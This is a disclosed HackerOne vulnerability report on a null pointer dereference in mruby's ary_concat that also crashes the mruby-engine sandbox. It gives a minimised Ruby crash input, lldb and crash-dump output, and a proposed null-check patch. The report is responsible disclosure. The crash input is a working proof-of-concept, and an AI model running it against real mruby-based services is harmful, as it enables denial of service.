# Null pointer dereference in ary_concat

## Report Details
- **Report ID**: 183667
- **URL**: https://hackerone.com/reports/183667
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-11-20T22:56:33.865Z
- **Disclosed**: 2016-12-17T20:51:30.882Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Hi,

The following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, then renamed variables and tidied so you can see what is needed and what isn't.

```
a=[0]
b=nil
a.each do |a|
  a = *case a
    when b
    redo
  end
end

```

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash.rb
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 22505 launched: './dev/bin/mruby' (x86_64)
Process 22505 stopped
* thread #1: tid = 0x576dfc2, 0x0000000100001c8b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)
    frame #0: 0x0000000100001c8b mruby`ary_concat + 27
mruby`ary_concat:
->  0x100001c8b <+27>: movl   0x18(%rdx), %ecx
    0x100001c8e <+30>: addl   -0x1c(%rbp), %ecx
    0x100001c91 <+33>: movl   %ecx, -0x20(%rbp)
    0x100001c94 <+36>: movq   -0x8(%rbp), %rdi
(lldb) bt
* thread #1: tid = 0x576dfc2, 0x0000000100001c8b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)
  * frame #0: 0x0000000100001c8b mruby`ary_concat + 27
    frame #1: 0x0000000100001c66 mruby`mrb_ary_concat + 70
    frame #2: 0x000000010004263f mruby`mrb_vm_exec + 25439
    frame #3: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #4: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #5: 0x000000010006f19f mruby`load_exec + 1183
    frame #6: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #7: 0x0000000100000d78 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x000000010080f480
       rbx = 0x0000000000000000
       rcx = 0x0000000000000000
       rdx = 0x0000000000000000
       rdi = 0x0000000100202c80
       rsi = 0x0000000000000000
       rbp = 0x00007fff5fbfca40
       rsp = 0x00007fff5fbfca20
        r8 = 0x0000000000000000
        r9 = 0x000000000000010e
       r10 = 0x9e006753f3831cf7
       r11 = 0x0000000000786e70
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001c8b  mruby`ary_concat + 27
    rflags = 0x0000000000010202
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

The cause for this is there is a null `RArray` struct getting sent via a ptr to `ary_concat`, and then the program is trying to retrieve and set members of this null struct.

A patch to fix would be similar to:

```
diff --git a/src/array.c b/src/array.c
index 47d5ce8..838f6e4 100644
--- a/src/array.c
+++ b/src/array.c
@@ -256,6 +256,9 @@ mrb_ary_s_create(mrb_state *mrb, mrb_value self)
 static void
 ary_concat(mrb_state *mrb, struct RArray *a, mrb_value *ptr, mrb_int blen)
 {
+  /* FIXME: throw an error? */
+  if (!a) return;
+
   mrb_int len = a->len + blen;
 
   ary_modify(mrb, a);
```

As mentioned above, this also affected mruby-engine via this:

```
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000018
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:001598 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:0019a0 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x000000010b3bb420 rbx: 0x000000010b418d20 rcx: 0x0000000000000003
 rdx: 0x000000010b3bb420 rdi: 0x000000010b3b3440 rsi: 0x0000000000000000
 rbp: 0x00007fff55298f40 rsp: 0x00007fff55298f10  r8: 0x0000000000000000
  r9: 0x000000010b3b4fa0 r10: 0x000000010b3c5ac0 r11: 0x0000000000000020
 r12: 0x000000010b3b35a8 r13: 0x0000000000000000 r14: 0x0000000000000000
 r15: 0x0000000000000000 rip: 0x000000010b29147d rfl: 0x0000000000010246

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010ab035d4 rb_vm_bugreport + 388
1   ruby                                0x000000010a9a5023 rb_bug_context + 483
2   ruby                                0x000000010aa78653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x000000010b29147d mrb_ary_concat + 29
5   ???                                 0x000000010b3b3440 0x0 + 4483396672

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
 <snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

After applying that patch to `ext/mruby_engine/mruby` and recompiling, that crash no longer happens.

Cheers,

Hugh

## Attachments
No attachments
